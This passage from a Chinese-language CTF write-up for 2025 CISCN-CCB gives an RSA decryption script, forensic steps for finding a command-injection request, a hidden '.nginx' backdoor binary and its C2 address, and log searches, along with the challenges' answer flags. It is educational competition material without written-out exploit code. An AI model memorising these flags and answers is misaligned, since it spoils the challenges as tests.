class="line"><span class="built_in">print</span>(p)</span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="comment">#107039821091476907017361040577100142080416506607330385914714896527723104434231991867446553926956088272494931767357910005226685224323888560118102752832821265121788585829575612779765001594434154517988820915969980410997090848817455330109147139014661903366930742269344732454435610621218450264594885489462013983987</span></span><br><span class="line"><span class="comment">#151677777799397230712001297032535496815539593864839536857494497889357845204973853077974576890314781663504855038646614281597509142082401258190873413836743927444104379591420166860126996505224123494050068333796017557802283729445202439509483655265818829771274657687534045119516831069023231285659118123116078992729</span></span><br></pre></td></tr></table></figure>
<p>然后解得d</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">p=<span class="number">107039821091476907017361040577100142080416506607330385914714896527723104434231991867446553926956088272494931767357910005226685224323888560118102752832821265121788585829575612779765001594434154517988820915969980410997090848817455330109147139014661903366930742269344732454435610621218450264594885489462013983987</span></span><br><span class="line">q=<span class="number">151677777799397230712001297032535496815539593864839536857494497889357845204973853077974576890314781663504855038646614281597509142082401258190873413836743927444104379591420166860126996505224123494050068333796017557802283729445202439509483655265818829771274657687534045119516831069023231285659118123116078992729</span></span><br><span class="line">d = invert(<span class="number">65537</span>, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment">#6109052349547257206697096233914872260989327686702877341357297374235483700898764426663731614354637333081857960824673503479028836612555987493725239652501170165553073731910636074799821398102203737540323068021873603013735631382159022431926454967088532329203130000441080435575597765980092908983838908398907972784232273234118645498740450016498454462799191401029143802550110050596585913392562268596838785215043032391431672670233571868072460160423058850272542871308182251910122824582051543573456850142342031440175701154950554859876416850016770939690923082085654825466912802560496063162148070829301504935160652899585466110913</span></span><br></pre></td></tr></table></figure>
<p>最终：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">16235562199200267459663730571049431604560323138825891010565012084966378560657028557593713658149224124014019674718841338098341965331592933997415694692050656493911264929774020942179882196570321425270890223396169112762011033004564308723485972391649681397363565727449598074059933122020979277213051522292750681766691422016751120287403039252908062651404902039208868924707593108364706700085611092189177151362213092719343563439787881931506466123650653478905555329561874204870585566987658878227630910823854130181333087408403245083629898953751267545552289595198873283690722202122622106505732576237684209082112223769923295430523</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">d=<span class="number">6109052349547257206697096233914872260989327686702877341357297374235483700898764426663731614354637333081857960824673503479028836612555987493725239652501170165553073731910636074799821398102203737540323068021873603013735631382159022431926454967088532329203130000441080435575597765980092908983838908398907972784232273234118645498740450016498454462799191401029143802550110050596585913392562268596838785215043032391431672670233571868072460160423058850272542871308182251910122824582051543573456850142342031440175701154950554859876416850016770939690923082085654825466912802560496063162148070829301504935160652899585466110913</span></span><br><span class="line">c=<span class="number">11618635355226290496294059660684603271588961451576288595852951276334806609033643787615488344507896857194047959998447214859969744967026400630924460267578943153410706528035442130937391499097216199001992180336450905339834216101657701141898474167790182212942369008350602241504906953057533358121870137756984024718626959548768270243611602403692209977991118081549322098177312841836591127963898605893447513836841527304670334168898249244877428516320988326935026436339811852851774767266645087443342058339001680095456544461819091726014417859396827670899885993279204262383019508480189625007076070194718973783400618991012898398971</span></span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b'4daa-b621-da2f37dc0435}'</span></span><br></pre></td></tr></table></figure>
<p>将两个部分合起来，就是最后的flag了</p>
<p>flag{7f33cdc8-da19-4daa-b621-da2f37dc0435}</p>
<h2 id="威胁检测与网络流量分析"><a href="#威胁检测与网络流量分析" class="headerlink" title="威胁检测与网络流量分析"></a>威胁检测与网络流量分析</h2><h3 id="zeroshell-1"><a href="#zeroshell-1" class="headerlink" title="zeroshell_1"></a>zeroshell_1</h3><p>打开附件的数据包</p>
<p><img src="/images/2025CISCN-CCB/33.png" alt=""></p>
<p>搜http可以直接找到一个关键的路径</p>
<p>跟踪数据包看一下</p>
<p><img src="/images/2025CISCN-CCB/34.png" alt=""></p>
<p>直接执行了命令</p>
<p>然后refer里面就是flag</p>
<p><img src="/images/2025CISCN-CCB/35.png" alt=""></p>
<h3 id="zeroshell-2"><a href="#zeroshell-2" class="headerlink" title="zeroshell_2"></a>zeroshell_2</h3><p>拿poc直接打，然后搜索全部文件中包含flag的</p>
<p><img src="/images/2025CISCN-CCB/36.png" alt=""></p>
<p>可以搜到，然后直接cat</p>
<p><img src="/images/2025CISCN-CCB/37.png" alt=""></p>
<h3 id="zeroshell-3"><a href="#zeroshell-3" class="headerlink" title="zeroshell_3"></a>zeroshell_3</h3><p>我们队伍先做的4，再做的3</p>
<p>根据队友传出来的文件，使用IDA查看这个文件，查看字符串，往下翻发现可疑ip和密码</p>
<p><img src="/images/2025CISCN-CCB/38.png" alt=""></p>
<p>查看该字符串存放位置，在根据调用链查看，该函数位于start，看起来也比较符合网络连接的代码。进行尝试，发现是正确的ip地址</p>
<p><img src="/images/2025CISCN-CCB/39.png" alt=""></p>
<h3 id="zeroshell-4"><a href="#zeroshell-4" class="headerlink" title="zeroshell_4"></a>zeroshell_4</h3><p>猜测隐藏文件以.开头，直接搜</p>
<p><img src="/images/2025CISCN-CCB/40.png" alt=""></p>
<p>看到一个nginx文件很可疑</p>
<p>看到一个elf文件</p>
<p><img src="/images/2025CISCN-CCB/41.png" alt=""></p>
<p>下载提取其中的elf文件，然后发给逆向手，逆向手去做的3和5</p>
<p>最终4的flag就是flag{.nginx}</p>
<h3 id="zeroshell-5"><a href="#zeroshell-5" class="headerlink" title="zeroshell_5"></a>zeroshell_5</h3><p>根据zeroshell_5解答正确，根据队友传出来的文件，使用IDA查看这个文件，查看字符串，往下翻发现可疑ip和密码</p>
<p><img src="/images/2025CISCN-CCB/42.png" alt=""></p>
<p>查看该字符串存放位置，在根据调用链查看，该函数位于start，看起来也比较符合网络连接的代码。同时这个密钥也在ip下方，进行尝试，发现是正确的。</p>
<p><img src="/images/2025CISCN-CCB/43.png" alt=""></p>
<h3 id="WinFT-1"><a href="#WinFT-1" class="headerlink" title="WinFT_1"></a>WinFT_1</h3><p>打开主机，桌面有一个currports程序，我们打开，下面有一个正在运行的exe程序</p>
<p><img src="/images/2025CISCN-CCB/44.png" alt=""></p>
<p>双击这个程序</p>
<p><img src="/images/2025CISCN-CCB/45.png" alt=""></p>
<p>flag{miscsecure.com:192.168.116.130:443}</p>
<h3 id="WinFT-2"><a href="#WinFT-2" class="headerlink" title="WinFT_2"></a>WinFT_2</h3><p>打开PCHunter程序，进入电脑体检中</p>
<p>选择启动信息，生成检测报告，最后一行有一个奇怪的命令，里面有flag</p>
<p><img src="/images/2025CISCN-CCB/46.png" alt=""></p>
<p>导出报告，cyberchef直接梭</p>
<p><img src="/images/2025CISCN-CCB/477.png" alt=""></p>
<p>得到flag</p>
<h3 id="sc05-1"><a href="#sc05-1" class="headerlink" title="sc05_1"></a>sc05_1</h3><p>告警IP为134.6.4.12（简称IP1），然后问我们IP1地址首次被请求时间是多久？</p>
<p>所以我们直接在firewall的excel中查找该ip地址</p>
<p>首先在http-export中搜索该ip</p>
<p><img src="/images/2025CISCN-CCB/47.png" alt=""></p>
<p>然后将2024/11/09_16:23:57 MD5加密，上交flag，发现错误</p>
<p>然后再去第二个表中查找，发现找不到</p>
<p>然后在tcp-export中进行查找</p>
<p><img src="/images/2025CISCN-CCB/48.png" alt=""></p>
<p>发现找到了两个ip地址，一个一个试</p>
<p>发现2024/11/09_16:22:42这个时间，MD5加密得到flag，就对了</p>
<p>得到flag{01DF5BC2388E287D4CC8F11EA4D31929}</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2024/11/05/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%94%E8%AE%B0/" rel="next" title="数据结构笔记">
                <i class="fa fa-chevron-left"></i> 数据结构笔记
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2025/02/01/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" rel="prev" title="2025西湖论剑">
                2025西湖论剑 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/">
              
                  <span class="site-state-item-count">41</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">categories</span>
                </a>
              </div>
            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-number">1.</span> <span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Safe-Proxy"><span class="nav-number">1.1.</span> <span class="nav-text">Safe_Proxy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hello-web"><span class="nav-number">1.2.</span> <span class="nav-text">hello_web</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">2.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#note"><span class="nav-number">2.1.</span> <span class="nav-text">note</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#dump"><span class="nav-number">3.1.</span> <span class="nav-text">dump</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fffffhash"><span class="nav-number">4.1.</span> <span class="nav-text">fffffhash</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#rasnd"><span class="nav-number">4.2.</span> <span class="nav-text">rasnd</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A8%81%E8%83%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="nav-number">5.</span> <span class="nav-text">威胁检测与网络流量分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#zeroshell-1"><span class="nav-number">5.1.</span> <span class="nav-text">zeroshell_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zeroshell-2"><span class="nav-number">5.2.</span> <span class="nav-text">zeroshell_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zeroshell-3"><span class="nav-number">5.3.</span> <span class="nav-text">zeroshell_3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zeroshell-4"><span class="nav-number">5.4.</span> <span class="nav-text">zeroshell_4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zeroshell-5"><span class="nav-number">5.5.</span> <span class="nav-text">zeroshell_5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinFT-1"><span class="nav-number">5.6.</span> <span class="nav-text">WinFT_1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WinFT-2"><span class="nav-number">5.7.</span> <span class="nav-text">WinFT_2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sc05-1"><span class="nav-number">5.8.</span> <span class="nav-text">sc05_1</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Luhaozhhhe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>






    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
  


  

  

</body>
</html>
